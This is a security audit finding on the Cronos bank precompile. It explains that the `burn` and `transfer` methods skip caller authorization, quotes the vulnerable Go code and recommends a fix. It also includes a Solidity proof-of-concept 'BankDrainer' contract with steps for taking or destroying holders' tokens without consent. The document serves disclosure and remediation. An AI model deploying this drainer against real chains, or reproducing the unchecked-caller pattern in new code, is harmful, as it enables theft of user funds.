### Title
Missing Caller Authorization in Bank Precompile `burn` and `transfer` Allows Any Contract to Drain User Balances - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `burn` and `transfer` methods perform no check that the calling contract is authorized to act on behalf of the `addr`/`sender` argument. Any unprivileged EVM contract can burn or transfer `evm/<callerContract>` denom tokens from any user's account without that user's consent.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles `mint`, `burn`, `balanceOf`, and `transfer` for native bank tokens whose denom is derived as `evm/<contract.Caller()>`.

For **`burn`** (lines 113–156):

```go
recipient := args[0].(common.Address)   // address to burn FROM
amount    := args[1].(*big.Int)
addr      := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller()) // "evm/<callerContract>"
// ...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
```

There is **no check** that `contract.Caller()` is authorized to burn from `addr`. The calling contract can name any victim address as `args[0]` and destroy their tokens.

For **`transfer`** (lines 167–200):

```go
sender    := args[0].(common.Address)   // taken from call arguments, NOT contract.Caller()
recipient := args[1].(common.Address)
from      := sdk.AccAddress(sender.Bytes())
to        := sdk.AccAddress(recipient.Bytes())
denom     := EVMDenom(contract.Caller())
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is **no check** that `contract.Caller() == sender` or that the caller holds any approval from `sender`. The calling contract can specify any victim as `args[0]` and any beneficiary as `args[1]`.

The only guard present is `checkBlockedAddr` on the recipient/to address, which only prevents sending to module-blocked addresses and does nothing to protect the source account. [1](#0-0) [2](#0-1) 

---

### Impact Explanation

**Critical — Unauthorized burn and transfer of precompile-controlled assets.**

Any EVM contract can:
1. Call `burn(victimAddress, amount)` → destroys `evm/<callerContract>` tokens held by `victimAddress` with no consent.
2. Call `transfer(victimAddress, attackerAddress, amount)` → moves `evm/<callerContract>` tokens from `victimAddress` to any address with no consent.

The affected asset class is `evm/<contract>` denom tokens — the native Cosmos bank representation of CRC20 tokens used throughout the Cronos bridge and conversion flows. Users who hold these tokens (e.g., after converting CRC20 ↔ native via the bank precompile) are fully exposed. [3](#0-2) 

---

### Likelihood Explanation

**High.** The attacker only needs to deploy an EVM contract — no privileged keys, governance access, or validator compromise required. The bank precompile is a globally registered precompile reachable by any contract call. Any token issuer using the bank precompile (the intended CRC20 ↔ native conversion pattern) can exploit this against their own token holders at any time. [4](#0-3) 

---

### Recommendation

**For `burn`:** Require that the address being burned from is `contract.Caller()` itself (i.e., the contract can only burn from its own account), or require an explicit on-chain approval from the victim analogous to ERC-20 `allowance`.

**For `transfer`:** Require `contract.Caller() == sender` so a contract can only move tokens it holds, not tokens held by arbitrary third parties.

Minimal fix:

```go
// burn: only allow burning from the calling contract's own account
if sdk.AccAddress(contract.Caller().Bytes()).String() != addr.String() {
    return nil, errors.New("caller not authorized to burn from this address")
}

// transfer: only allow transferring from the calling contract's own account
if sdk.AccAddress(contract.Caller().Bytes()).String() != from.String() {
    return nil, errors.New("caller not authorized to transfer from this address")
}
``` [5](#0-4) [6](#0-5) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function burn(address addr, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BankDrainer {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64));

    // Step 1: attacker mints evm/<this> tokens to victim (e.g. via airdrop)
    // Step 2: attacker calls drainBurn or drainTransfer — no victim approval needed

    function drainBurn(address victim, uint256 amount) external {
        // Burns victim's evm/<address(this)> tokens with no consent
        bank.burn(victim, amount);
    }

    function drainTransfer(address victim, address attacker, uint256 amount) external {
        // Transfers victim's evm/<address(this)> tokens to attacker with no consent
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Attacker deploys `BankDrainer`.
2. Victim acquires `evm/<BankDrainer>` tokens through any normal path (mint, IBC, swap).
3. Attacker calls `drainTransfer(victim, attacker, victimBalance)` — victim's entire balance is stolen with no signature or approval from the victim.
4. Alternatively, `drainBurn(victim, victimBalance)` destroys the victim's tokens entirely.

The precompile at `0x64` executes `bankKeeper.SendCoins(victim, attacker, ...)` with no authorization check on `victim`. [7](#0-6) [8](#0-7)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L30-33)
```go
var (
	bankABI                 abi.ABI
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
```

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L66-69)
```go
// NewBankContract creates the precompiled contract to manage native tokens
func NewBankContract(bankKeeper types.BankKeeper, cdc codec.Codec, kvGasConfig storetypes.GasConfig) vm.PrecompiledContract {
	return &BankContract{bankKeeper, cdc, kvGasConfig}
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L103-111)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
